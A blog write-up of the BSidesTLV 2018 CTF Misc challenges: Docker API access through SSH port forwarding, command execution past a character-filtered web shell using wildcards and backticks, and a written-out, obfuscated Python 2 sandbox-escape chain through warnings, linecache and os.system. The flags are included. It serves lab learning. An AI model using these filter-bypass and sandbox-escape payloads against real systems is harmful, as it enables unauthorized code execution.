---
layout: post
title: "BSidesTLV: 2018 CTF (Misc)"
date: 2018-10-24 18:53:07 +0000
last_modified_at: 2018-12-09 08:12:55 +0000
category: CTF
tags: [BSidesTLV]
comments: true
image:
  feature: bsidestlv.jpg
---

This post documents my attempt to complete [BSidesTLV: 2018 CTF (Misc)](https://www.vulnhub.com/entry/bsidestlv-2018-ctf,250/). If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

The 2018 BSidesTLV CTF competition brought together over 310 teams burning the midnight oil to crack our challenges in a bout that lasted for two weeks. You can now enjoy the same pain and suffering, using this easy-to-use, condensed VM that now hosts all our challenges in an easy to digest format. The CTF has five categories:

+ Web (10 challenges)
+ Reverse Engineering (3 challenges)
+ Misc (3 challenges)
  1. <a href="#{{ 'DockingStation' | downcase | replace: ' ', '-'}}">DockingStation</a>
  2. <a href="#{{ 'c1337Shell' | downcase | replace: ' ', '-'}}">c1337Shell</a>
  3. <a href="#{{ 'PySandbox-Insane' | downcase | replace: ' ', '-'}}">PySandbox-Insane</a>
+ Forensics (1 challenge)
+ Crypto (2 challenges)

What follows is my humble attempt of cracking the challenges in the **Misc** category.

### DockingStation

This is how the challenge looks like.

<a class="image-popup">
![c7de4a68.png](/assets/images/posts/bsidestlv-misc/c7de4a68.png)
</a>

After logging in, this is what I found.

<a class="image-popup">
![d59d61f1.png](/assets/images/posts/bsidestlv-misc/d59d61f1.png)
</a>

If I had to guess, I would say that's a Unix socket connected to a Docker. And since I've the SSH credentials, I can make use of SSH local port forwarding and connect to the Docker like so.

<a class="image-popup">
![3581904c.png](/assets/images/posts/bsidestlv-misc/3581904c.png)
</a>

Look Ma, got access to Docker [API](https://docs.docker.com/engine/api/v1.37/) without using Unix socket.

<a class="image-popup">
![b6f6570d.png](/assets/images/posts/bsidestlv-misc/b6f6570d.png)
</a>

The stopped container with the image `galf` is highly suspicious. On second look, notice the reverse of `galf` is `flag`? This must be it.

My attempts to start the container resulted in an error.

<a class="image-popup">
![c4f4c07b.png](/assets/images/posts/bsidestlv-misc/c4f4c07b.png)
</a>

I came across the command to export the entire container as a tarball after consulting the API.

<a class="image-popup">
![770aa59a.png](/assets/images/posts/bsidestlv-misc/770aa59a.png)
</a>

After extracting the files from the tarball, the flag is at `/home/flag_is_here/flag.txt`.

<a class="image-popup">
![d6da982b.png](/assets/images/posts/bsidestlv-misc/d6da982b.png)
</a>

The flag is `BSidesTLV{i_am_r34dy_t0_esc4p3_th3_d0ck3r!}`.

### c1337Shell

This is how the challenge looks like.

<a class="image-popup">
![f566bc99.png](/assets/images/posts/bsidestlv-misc/f566bc99.png)
</a>

Let's visit the challenge URL.

<a class="image-popup">
![cb794b70.png](/assets/images/posts/bsidestlv-misc/cb794b70.png)
</a>

Appears to be a web shell. Turns out that it doesn't accept alphanumerical characters and `$&|\'<>`.

Look what happens when I supply a bad character?

<a class="image-popup">
![6806a44f.png](/assets/images/posts/bsidestlv-misc/6806a44f.png)
</a>

Now look what happens when I supply the tilde `~` character?

<a class="image-popup">
![1d3306cd.png](/assets/images/posts/bsidestlv-misc/1d3306cd.png)
</a>

In `bash`, the tilde `~` character represents the home directory of the current user. I suspect "the other side" is `echo`ing out shell output, whatever "the other side" is.

In that case, I should be able to use shell wildcards. The wildcard `?` and `*` represents single character and zero-or-more characters respectively.

Using these two wildcards, I was able to map out where the flag is.

<a class="image-popup">
![5aa73479.png](/assets/images/posts/bsidestlv-misc/5aa73479.png)
</a>

The problem now is this—how the f\*\*k do I display the flag with `cat`? With backticks `` `...` `` (or command substitution) and wildcards of course!

We know `cat` is at `/bin/cat`. We can use `/???/???` to represent it. Of course, there are other directories and commands behind that pattern. But, when you surround it with backticks, the shell should execute the command and skip the rest of the non-executable. Let's give it a shot.

<a class="image-popup">
![177cc70b.png](/assets/images/posts/bsidestlv-misc/177cc70b.png)
</a>

The flag is:

```
BSidesTLV{1_l1k3_wildcards_&_r3g3x_but_h8_th3_cr34t0r}
```

### PySandbox-Insane

This is how the challenge looks like.

<a class="image-popup">
![00261ba8.png](/assets/images/posts/bsidestlv-misc/00261ba8.png)
</a>

The aim of this challenge is to escape the sandbox and run the following code.

```py
import os; os.system("curl secret/flag.txt")
```

That's all. No more no less.

How do we crack this challenge then? Remember Python's axiom? _Everything is an object_. CPython provides [special methods](https://docs.python.org/3/reference/datamodel.html#special-method-names) to get/set attributes from/in an object. Essentially, CPython allows shortcuts or syntactic sugar for a simple statement such as `import os`. Under the hood, it's all special methods and/or special attributes at work.

For example, let's say you want to assign the integer `1` to variable `a`. This is how you do it in Python 2.7.

```
>>> a = 1
>>> a
1
```

Or, you can do it this way.

```
>>> __builtins__.__setattr__("a", 1)
>>> a
1
```

Which is another way of saying, "I'm setting an attribute with a name of 'a' and value of 1 in the `__builtins__` module." `__builtins__` is a module (an object by the way) that provides direct access to all the 'built-in' identifiers of Python. Use `__builtins__.__dict__` to view all the attributes of this object.

Armed with this simple introduction, how do we run the above code? Again, the challenge has provided the much-needed hints.

<a class="image-popup">
![53fa6e73.png](/assets/images/posts/bsidestlv-misc/53fa6e73.png)
</a>

If you look at the subclasses that inherit from `object`, you'll find that `warningmessage` is one of them.

<a class="image-popup">
![a9b63ff6.png](/assets/images/posts/bsidestlv-misc/a9b63ff6.png)
</a>

Dig deeper into the [source code](https://github.com/python/cpython/blob/2.7/Lib/warnings.py) of the `warnings` module, you'll see that the `warnings` module imports the `linecache` module.

<a class="image-popup">
![42b3f2fc.png](/assets/images/posts/bsidestlv-misc/42b3f2fc.png)
</a>

Further down the code, you'll find the `warnings.WarningMessage` class.

<a class="image-popup">
![c84f1469.png](/assets/images/posts/bsidestlv-misc/c84f1469.png)
</a>

We can continue into the [source code](https://github.com/python/cpython/blob/2.7/Lib/linecache.py) of the `linecache` module, and you'll see that it imports the `os` module.

<a class="image-popup">
![118b740a.png](/assets/images/posts/bsidestlv-misc/118b740a.png)
</a>

In summary, we can expand the code above like this.

```
obj = __builtins__.__class__.__mro__[1]
sub = obj.__subclasses__
war = sub()[58]
ini = war.__init__
glo = ini.func_globals
lin = glo["linecache"]
dic = lin.__dict__
ops = dic["os"]
run = ops.["system"]
run("curl secret/flag.txt")
```

Of course, certain words are still banned from use by the firewall. Recall how Python performs `a = 1` under the hood? It's actually setting an attribute in the `__builtins__` object. With that in mind, we can make use of another trick to bypass the firewall—first break up the banned words and then combine them back through concatenation. Python uses the `+` operator for string concatenation. In fact, Python uses `__add__` method-wrapper internally to do that.

For example, I can represent "curl" with `"cu".__add__("rl")`.

Here's the convoluted version. **Warning**: lots of typing ahead.

```py
__builtins__.__setattr__("obj",__builtins__.__getattribute__("__class".__add__("__")).mro(  ).__getitem__(1))
__builtins__.__setattr__("sub",obj.__getattribute__(obj,"__sub".__add__("classes__")))
__builtins__.__setattr__("war",sub( ).__getitem__(58))
__builtins__.__setattr__("ini",war.__getattribute__(war,"__in".__add__("it__")))
__builtins__.__setattr__("glo",ini.__getattribute__("__glo".__add__("bals__")))
__builtins__.__setattr__("lin",glo.__getitem__("line".__add__("cache")))
__builtins__.__setattr__("dic",lin.__getattribute__("__dic".__add__("t__")))
__builtins__.__setattr__("ops",dic.__getitem__("o".__add__("s")))
__builtins__.__setattr__("run",ops.__getattribute__("sy".__add__("stem")))
run("cu".__add__("rl	sec").__add__("ret/fl").__add__("ag.txt"))
```

I've also replaced space (`0x20`) with tab (`0x09`) to bypass the firewall.

<a class="image-popup">
![89b5efca.png](/assets/images/posts/bsidestlv-misc/89b5efca.png)
</a>

The flag is `BSidesTLV{I_AM_The_Python_Master}`.
